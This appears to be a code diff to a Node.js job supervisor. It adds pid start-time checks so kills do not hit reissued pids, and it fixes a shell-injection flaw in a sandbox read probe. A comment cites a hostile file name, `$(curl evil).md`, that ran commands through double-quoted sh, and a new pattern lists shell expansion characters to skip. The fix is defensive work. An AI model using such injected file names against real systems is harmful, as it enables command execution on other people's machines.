@@ -9,6 +9,7 @@ import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
 import { spawn, spawnSync } from 'node:child_process';
+import { randomBytes } from 'node:crypto';
 import { fileURLToPath } from 'node:url';
 
 const SELF = fileURLToPath(import.meta.url);
@@ -267,6 +268,14 @@ const PID_ARRAY_FIELDS = ['reapedPids', 'codexPids'];
 // Counters, which may be zero but never negative or fractional.
 const COUNTER_FIELDS = ['recordVersion', 'generation'];
 
+// pid -> the OS's start time for the process that number MEANT when it was
+// written down (see the pid-identity note below `pidAlive`). One map for the
+// whole job rather than a field per pid: the supervisor's number and codex's
+// live in the same place, and a reader needs one lookup for any of them.
+// Absent is normal — a record written before this field existed, or one whose OS
+// would not answer — and every reader treats absence as "no opinion".
+const PID_START_FIELD = 'pidStarts';
+
 // Two of the record's fields become PATH SEGMENTS — `role` reaches
 // `<root>/.role-locks/<role>/`, which a release renames away and then removes
 // recursively, and `id` names the job directory. Type-checking them as strings
@@ -394,6 +403,23 @@ export function validateRecord(parsed) {
     if (v === undefined || v === null) continue;
     if (!Number.isSafeInteger(v) || v < 0) {
       return `field "${key}" is not a non-negative integer (${JSON.stringify(v)})`;
+    }
+  }
+  // The start-time map is read to decide whether a recorded pid still names the
+  // job's own process, so its keys have to be pids and its values have to be
+  // text. Anything else is a record this runtime did not write.
+  const starts = parsed[PID_START_FIELD];
+  if (starts !== undefined && starts !== null) {
+    if (typeof starts !== 'object' || Array.isArray(starts)) {
+      return `field "${PID_START_FIELD}" is not an object (${typeName(starts)})`;
+    }
+    for (const [key, when] of Object.entries(starts)) {
+      if (!/^\d+$/.test(key) || !isPid(Number(key))) {
+        return `field "${PID_START_FIELD}" is keyed by something that is not a pid (${JSON.stringify(clean(key).slice(0, 40))})`;
+      }
+      if (typeof when !== 'string') {
+        return `field "${PID_START_FIELD}" holds a start time that is not a string (${typeName(when)})`;
+      }
     }
   }
   if (parsed.exitCode !== undefined && parsed.exitCode !== null && !Number.isSafeInteger(parsed.exitCode)) {
@@ -549,15 +575,19 @@ function sanitizeRecord(record) {
   return out;
 }
 
-function writeRecord(dir, record) {
-  const tmp = path.join(dir, `job.json.${process.pid}.tmp`);
-  fs.writeFileSync(tmp, JSON.stringify(sanitizeRecord(record), null, 2) + '\n');
+function renameWithRetry(from, to) {
   for (let attempt = 0; ; attempt++) {
-    try { return fs.renameSync(tmp, recordPath(dir)); } catch (err) {
+    try { return fs.renameSync(from, to); } catch (err) {
       if (attempt >= 5 || !['EPERM', 'EBUSY', 'EACCES'].includes(err.code)) throw err;
       sleepSync(20);
     }
   }
+}
+
+function writeRecord(dir, record) {
+  const tmp = path.join(dir, `job.json.${process.pid}.tmp`);
+  fs.writeFileSync(tmp, JSON.stringify(sanitizeRecord(record), null, 2) + '\n');
+  return renameWithRetry(tmp, recordPath(dir));
 }
 
 // ------------------------------------------------- one writer at a time
@@ -675,6 +705,161 @@ export function pidAlive(pid) {
   try { process.kill(pid, 0); return true; } catch (err) { return livenessFromError(err); }
 }
 
+// --------------------------------------------------------------- pid identity
+//
+// A PID IS A NUMBER THE OS HANDS BACK OUT. Every kill target here is written down
+// once — supervisor.pid at spawn, codex.pid a moment later — and fired at
+// whenever a cancel, a `--force` or a reap gets round to it, which can be hours
+// after the process it named died. By then the number may belong to someone
+// else's editor. `reaped.pids` does not cover this: it stops a SECOND shot at a
+// number, and the first is the one that lands on a stranger. The same number read
+// as "still alive" is also how a job whose supervisor died in the night reads
+// `running` for ever, blocking its role and refusing every dispatch.
+//
+// So the start time is recorded beside the pid, and a number whose process
+// started at a different moment is not the process this job spawned.
+//
+// THE CHECK ONLY EVER SUBTRACTS. No recorded start time (a record from before
+// this field existed), or no readable current one (the query failed, this
+// platform's `ps` cannot say, the process is already gone), leaves the pid with
+// exactly the standing it had before: it is killed, and it is read as alive.
+// Identity can withdraw a kill target or a liveness claim; it can never
+// manufacture one — because the direction that costs money is declining to kill
+// a codex that really is there, and that direction stays closed.
+//
+// Two readings of the same instant differ by the rounding of whatever printed
+// them, so a couple of seconds apart is the same process.
+const START_TIME_SLOP_MS = 2000;
+
+// Test-only: the start time the OS would report for a pid right now. Real pid
+// reuse cannot be aimed at in CI — it needs the OS to reissue a specific number —
+// and what is under test is the DECISION (a moved start time is a different
+// process), never the reuse itself. Format: `<pid>:<start>`, comma- or
+// space-separated; everything after the first colon is the value.
+function injectedStartTime(pid) {
+  const raw = process.env.CODEX_DISPATCH_TEST_START_TIME;
+  if (!raw) return null;
+  for (const part of raw.split(/[\s,]+/).filter(Boolean)) {
+    const at = part.indexOf(':');
+    if (at > 0 && Number(part.slice(0, at)) === pid) return part.slice(at + 1);
+  }
+  return null;
+}
+
+// Answered once per pid per process: a live pid's start time cannot change, and
+// the watcher asks about the same supervisor every 500ms for as long as the job
+// runs — a shell spawn a tick is not a diagnostic, it is a load. A number
+// reissued DURING one of these processes' lifetimes reads as the old process,
+// which is the fail-open direction and exactly today's behaviour. Misses are
+// cached too: a query that could not answer once will not answer better 500ms
+// later, and its answer is "no opinion" either way.
+const startTimeCache = new Map();
+
+// The OS's start time for each of these pids, as ISO text, in ONE query — a
+// cancel checks several, and a shell spawn each is a cost paid on the path that
+// stops a codex from billing. A pid the OS will not report is simply absent from
+// the map, which every caller reads as "no opinion". Same powershell/pwsh
+// fallback and windowsHide as processTable, for the same reasons.
+//
+// POSIX uses elapsed seconds rather than `lstart`: `etimes` is an integer this
+// runtime turns into an absolute instant itself, so the recorded value and the
+// checked one are the same shape and cannot disagree because two processes had
+// different locales. A `ps` without `etimes` (macOS) reports nothing, which is
+// the fail-open case above rather than a wrong answer.
+function pidStartTimes(pids) {
+  const out = new Map();
+  const ask = [];
+  for (const pid of [...new Set(pids.filter(isPid))]) {
+    const injected = injectedStartTime(pid);
+    if (injected !== null) { out.set(pid, injected); continue; }
+    if (startTimeCache.has(pid)) {
+      const cached = startTimeCache.get(pid);
+      if (cached) out.set(pid, cached);
+      continue;
+    }
+    ask.push(pid);
+  }
+  if (!ask.length) return out;
+  const found = new Map();
+  // Every pid that was asked about gets an entry, so a pid the OS would not name
+  // is not asked about again by this process.
+  const answer = () => {
+    for (const pid of ask) startTimeCache.set(pid, found.get(pid) || null);
+    for (const [pid, when] of found) out.set(pid, when);
+    return out;
+  };
+  const opts = { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true, timeout: 15000 };
+  if (!WIN) {
+    const r = spawnSync('ps', ['-o', 'pid=,etimes=', '-p', ask.join(',')], opts);
+    if (r.status !== 0) return answer();
+    const now = Date.now();
+    for (const line of String(r.stdout || '').split(/\r?\n/)) {
+      const m = line.trim().match(/^(\d+)\s+(\d+)$/);
+      if (m) found.set(Number(m[1]), new Date(now - Number(m[2]) * 1000).toISOString());
+    }
+    return answer();
+  }
+  // The filter is built from numbers that already passed `isPid`, so nothing
+  // untrusted reaches the WQL. `.ToString('o')` is the round-trip format:
+  // culture-invariant, so it means the same thing to whoever reads it back.
+  const filter = ask.map((p) => `ProcessId=${p}`).join(' or ');
+  const script =
+    `Get-CimInstance Win32_Process -Filter '${filter}' | ` +
+    `ForEach-Object { "$($_.ProcessId) $($_.CreationDate.ToString('o'))" }`;
+  for (const shell of ['powershell', 'pwsh']) {
+    const r = spawnSync(shell, ['-NoProfile', '-NonInteractive', '-Command', script], opts);
+    if (r.status !== 0) continue;
+    for (const line of String(r.stdout || '').split(/\r?\n/)) {
+      const m = line.trim().match(/^(\d+)\s+(\S+)$/);
+      if (m) found.set(Number(m[1]), m[2]);
+    }
+    if (found.size) return answer();
+  }
+  return answer();
+}
+
+// Same process, or not enough evidence to say otherwise. Absence on either side
+// is the fail-open case. Two unparseable strings that differ are treated as a
+// mismatch: both readings come from the same command on the same machine, so for
+// the same process they are the same bytes.
+export function sameStartTime(recorded, current) {
+  if (typeof recorded !== 'string' || !recorded) return true;
+  if (typeof current !== 'string' || !current) return true;
+  if (recorded === current) return true;
+  const a = Date.parse(recorded);
+  const b = Date.parse(current);
+  if (!Number.isFinite(a) || !Number.isFinite(b)) return false;
+  return Math.abs(a - b) <= START_TIME_SLOP_MS;
+}
+
+// Which of these pids are still the processes the record wrote down. Pids with
+// no recorded start time pass through untouched — see the note above: this
+// filter only ever removes.
+function recordedProcesses(record, pids) {
+  const starts = (record && !isCorrupt(record) && record[PID_START_FIELD] && typeof record[PID_START_FIELD] === 'object')
+    ? record[PID_START_FIELD]
+    : {};
+  const checkable = pids.filter((p) => isPid(p) && typeof starts[String(p)] === 'string');
+  const current = checkable.length ? pidStartTimes(checkable) : new Map();
+  return pids.filter((p) => sameStartTime(starts[String(p)], current.get(p)));
+}
+
+// The start times to write down beside a set of pids, in the record's shape.
+// Empty when the OS would not say, which is the same thing as not recording them.
+//
+// Never off the cache: this is the one moment the number is KNOWN to be the
+// process just spawned, and this process may have asked about that same number
+// earlier, when it belonged to the dead job a `--force` was clearing. Recording
+// the dead one's start time as ours would make every later kill decline to
+// signal our own supervisor — the single direction that ends with a codex
+// nobody will stop.
+function startTimesFor(pids) {
+  for (const pid of pids) startTimeCache.delete(pid);
+  const out = {};
+  for (const [pid, when] of pidStartTimes(pids)) out[String(pid)] = clean(when);
+  return out;
+}
+
 // Every listing verb walks this, and every one of them then reads pid files,
 // kills, renames or removes through what it finds. So the walk is where the
 // containment is proved: a directory entry inside the jobs root is only a job if
@@ -755,7 +940,12 @@ function effectiveState(job) {
   // nor in LIVE_STATES — it lost its role claim while codex ran. (Codex arm.)
   const state = canonicalState(r);
   if (state !== 'running') return state;
-  if (!pidAlive(r.supervisorPid)) {
+  // A live pid is not the same as OUR live pid. The number is reissued, and a
+  // record naming one that now belongs to something else used to read `running`
+  // for ever: the job blocked its role and every refusal claimed codex might
+  // still be billing. Identity is checked second, so a dead pid never pays for
+  // the query, and an unknown answer leaves the liveness reading as it was.
+  if (!pidAlive(r.supervisorPid) || !recordedProcesses(r, [r.supervisorPid]).length) {
     // grace: supervisor registers its own pid shortly after spawn
     if (!r.supervisorPid && Date.now() - Date.parse(r.started) < CLAIM_GRACE_MS) return 'running';
     return 'stale';
@@ -865,8 +1055,8 @@ const UNPROVEN_EXPLANATION =
   'back through codex\'s sandbox with its bytes returned.\n' +
   'Cures, best first:\n' +
   '  - CLI too old to have `codex sandbox`: npm install -g @openai/codex, then re-run preflight.\n' +
-  '  - Nothing readable in the job\'s --cd (empty, all binary, or every candidate name carries\n' +
-  '    %, ^, & or !): point --cd at the directory the model actually has to read.\n' +
+  '  - Nothing readable in the job\'s --cd (empty, all binary, or every candidate name carries a\n' +
+  '    shell expansion character): point --cd at the directory the model actually has to read.\n' +
   '  - Accept it knowingly: re-dispatch with --allow-unproven-sight. The job then runs, the\n' +
   '    record carries `sight: unproven (accepted by caller)`, status and result both say so,\n' +
   '    and the answer is delivered with that caveat attached.';
@@ -959,6 +1149,20 @@ function resolveBin() {
 // in what we send, or an echo is indistinguishable from a read.
 const MIN_SIGHT_TOKEN = 12;
 
+// The probe's POSIX half runs `sh -c "cat <file>"`, and the file name comes off
+// the job's own cwd — a directory somebody else fills. `JSON.stringify` was
+// doing this quoting, and it produces a DOUBLE-quoted string: sh expands
+// `$(...)`, backticks and backslashes inside those, so a file named
+// `$(curl evil).md` sitting in the probed directory RAN during the read meant to
+// prove sight. Single quotes are the one sh quoting that expands nothing at all;
+// the `'\''` dance is how a single quote is carried through them. Names carrying
+// these characters are also skipped outright (see pickProbeTarget) — this is the
+// second lock on the same door, and the one that holds for the job-nonce path,
+// where the name is ours but the directory is not.
+export function shQuote(s) {
+  return `'${String(s).replace(/'/g, "'\\''")}'`;
+}
+
 // How many times a probe whose TRANSPORT failed is retried before the runtime
 // gives up and says so. Deliberately small: a real spawn failure repeats, a flake
 // does not.
@@ -1002,7 +1206,7 @@ let injectedProbeErrorsUsed = 0;
 function sandboxRead(bin, file, { cwd, token } = {}) {
   const args = WIN
     ? ['sandbox', 'cmd', '/c', 'type', file]
-    : ['sandbox', 'sh', '-c', `cat ${JSON.stringify(file)}`];
+    : ['sandbox', 'sh', '-c', `cat ${shQuote(file)}`];
   const sent = [bin, ...args].join(' ');
   if (typeof token !== 'string' || token.length < MIN_SIGHT_TOKEN) {
     return {
@@ -1096,19 +1300,23 @@ export function sandboxProbe(bin) {
   }
 }
 
-// 128 bits of Math.random-grade entropy, which is the right strength for this:
-// the secret has to be unguessable by a stand-in that never read the file, not
-// unforgeable by an attacker who can read our memory.
+// 128 bits from the OS CSPRNG: the secret has to be unguessable by a stand-in
+// that never read the file, and `crypto` costs nothing here that `Math.random`
+// was buying.
 function randomToken() {
-  return `${Math.random().toString(36).slice(2)}${Math.random().toString(36).slice(2)}`.slice(0, 20);
+  return randomBytes(16).toString('hex');
 }
 
 // Pick a file that ALREADY EXISTS in the job's cwd, plus a token from it to
 // verify the read by. Never writes there: a job's `--cd` is somebody's repo, and
 // a runtime that litters it is one nobody points at anything precious.
 // The token is ASCII-only so a console codepage cannot mangle the comparison, and
-// names carrying cmd.exe's expansion characters are skipped rather than trusted
-// to the documented best-effort quoting.
+// names carrying an expansion character of EITHER shell are skipped rather than
+// trusted to quoting: `% ^ & ! "` are cmd.exe's, and `$ ` \ '` are sh's — a file
+// called `$(cmd).md` in the probed directory used to execute during the probe.
+// Skipping is the cheap half (a name this runtime never has to handle is a name
+// that cannot bite); shQuote above is the half that still holds if this list is
+// ever loosened.
 //
 // WHERE the token comes from is the security property. It used to be the file's
 // first line, which is exactly the part a tool that never opened the file is most
@@ -1119,6 +1327,10 @@ function randomToken() {
 // file's own name: bytes nobody can produce without having read the file.
 const PRINTABLE_ASCII_LINE = /^[\x20-\x7E]+$/;
 
+// cmd.exe's expansion characters and sh's, in one list: a candidate name
+// carrying any of them is passed over for the next file rather than quoted.
+export const PROBE_UNSAFE_NAME = /[%^&!"$`\\']/;
+
 export function pickProbeTarget(dir, { limit = 20, maxBytes = 1024 * 1024 } = {}) {
   let entries;
   try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return null; }
@@ -1126,7 +1338,7 @@ export function pickProbeTarget(dir, { limit = 20, maxBytes = 1024 * 1024 } = {}
   let examined = 0;
   for (const name of names) {
     if (examined >= limit) break;
-    if (/[%^&!"]/.test(name)) continue;
+    if (PROBE_UNSAFE_NAME.test(name)) continue;
     const full = path.join(dir, name);
     let size;
     try { size = fs.statSync(full).size; } catch { continue; }
@@ -1810,10 +2022,14 @@ function recordReapedPids(dir, pids) {
   if (!list.length) return;
   try {
     const prior = readPidList(path.join(dir, REAPED_PIDS_FILE));
-    fs.writeFileSync(
-      path.join(dir, REAPED_PIDS_FILE),
-      [...new Set([...prior, ...list])].join('\n') + '\n'
-    );
+    // Temp file and rename, exactly as job.json gets it. This file exists FOR the
+    // case where the record copy is unusable, so a reader catching it half-written
+    // — a process killed mid-write, a machine that lost power — would lose the one
+    // list that keeps a spent number from being fired at again. A rename is either
+    // done or not done.
+    const tmp = path.join(dir, `${REAPED_PIDS_FILE}.${process.pid}.tmp`);
+    fs.writeFileSync(tmp, [...new Set([...prior, ...list])].join('\n') + '\n');
+    renameWithRetry(tmp, path.join(dir, REAPED_PIDS_FILE));
   } catch { /* best effort: the record copy below is the other half */ }
   const current = readRecord(dir);
   if (isCorrupt(current)) return; // evidence — never rewritten
@@ -1962,9 +2178,26 @@ function killJob(job) {
   // thing that stops an orphan billing. (Non-Windows has no tree kill at all,
   // so it always needed this.)
   targets.push(...recordedPids(job.dir));
-  const unique = [...new Set(targets.filter(isPid))];
+  const written = [...new Set(targets.filter(isPid))];
+  // IDENTITY BEFORE THE TRIGGER. These numbers were written down when the job
+  // started and may be firing hours later, by which time the OS can have reissued
+  // one of them — and `taskkill /PID <n> /T /F` at a reused number kills a
+  // stranger's process tree. A pid whose process no longer carries the start time
+  // this job recorded is treated as already dead: not fired at, not counted as a
+  // survivor. Pids with nothing recorded are unchanged (see `recordedProcesses`).
+  const unique = recordedProcesses(r, written);
+  const reissued = written.filter((pid) => !unique.includes(pid));
+  if (reissued.length) {
+    process.stderr.write(
+      `note: job ${clean(job.id)} recorded pid(s) ${reissued.join(', ')}, and the process(es) holding ` +
+      `those numbers now\nstarted at a different time — the OS reissued them. They belong to something ` +
+      `else and have NOT been\nsignalled; whatever this job ran is already gone.\n`
+    );
+  }
   const window = killWindow(r, Date.now(), {
-    supervisorDead: !isCorrupt(r) && Boolean(r.supervisorPid) && !pidAlive(r.supervisorPid),
+    supervisorDead:
+      !isCorrupt(r) && Boolean(r.supervisorPid) &&
+      (!pidAlive(r.supervisorPid) || !unique.includes(r.supervisorPid)),
   });
   // INSIDE THE CODEX-EXEC WINDOW, KILL NOTHING. codex exists and its pid is
   // written down nowhere; the supervisor is the one process that has it, and
@@ -2320,7 +2553,14 @@ function cmdDispatch(opts) {
     // read-modify-write could put `running` back over it — telling the operator
     // the job was killed, releasing the role, and leaving codex to run.
     fs.writeFileSync(path.join(dir, 'supervisor.pid'), String(child.pid));
-    updateRecord(dir, { supervisorPid: child.pid, launch: 'spawned' });
+    // The start time goes down WITH the number, here, while the process is
+    // certainly still the one just spawned. It is what tells a cancel hours from
+    // now whether this pid is still ours or a number the OS has reissued.
+    updateRecord(dir, {
+      supervisorPid: child.pid,
+      [PID_START_FIELD]: startTimesFor([child.pid]),
+      launch: 'spawned',
+    });
     // Attached only so a late 'error' cannot throw out of an already-detached
     // child; the synchronous pid check above is what actually decides.
     child.on('error', (err) => {
@@ -2404,7 +2644,13 @@ function cmdSupervise(dir) {
   const existing = readRecord(dir);
   const record = (!isCorrupt(existing) && existing.supervisorPid === process.pid)
     ? existing
-    : updateRecord(dir, { supervisorPid: process.pid });
+    : updateRecord(dir, {
+      supervisorPid: process.pid,
+      [PID_START_FIELD]: {
+        ...(!isCorrupt(existing) && existing[PID_START_FIELD] ? existing[PID_START_FIELD] : {}),
+        ...startTimesFor([process.pid]),
+      },
+    });
   if (!record) {
     process.stderr.write(`supervisor: job.json is corrupt, refusing to run: ${dir}\n`);
     process.exit(1);
@@ -2656,6 +2902,12 @@ function cmdSupervise(dir) {
   updateRecord(dir, {
     codexPid: isPid(child.pid) ? child.pid : null,
     codexPids,
+    // Merged, never replaced: the supervisor's own entry was written by the
+    // dispatch that spawned it and is still the thing a cancel checks us by.
+    [PID_START_FIELD]: {
+      ...(record[PID_START_FIELD] || {}),
+      ...startTimesFor(codexPids),
+    },
     // POSIX: codex is detached, so it leads a group whose emptiness is part of a
     // verified kill. On Windows the tree is taskkill's business.
     codexPgid: !WIN && isPid(child.pid) ? child.pid : null,
@@ -2706,13 +2958,17 @@ function cmdSupervise(dir) {
       const warnings = [];
       if (blind) warnings.push(`sandbox-failure signatures in log (${blind})`);
       if (warning) warnings.push(warning);
+      // The read above is not the decision — the scan takes long enough for a
+      // cancel to land inside it, and a `killed` verdict written in that gap used
+      // to be overwritten by this `done`. The precondition is re-evaluated inside
+      // the lock, so the other writer's verdict wins the race it just won.
       updateRecord(dir, {
         state: code === 0 ? 'done' : 'failed',
         warning: warnings.length ? warnings.join('; ') : undefined,
         blindSignature: blind || undefined,
         exitCode: code,
         finished: new Date().toISOString(),
-      });
+      }, { expect: (rec) => canonicalState(rec) === 'running' });
     }
     releaseRole(root, record.role, id);
     process.exit(0);
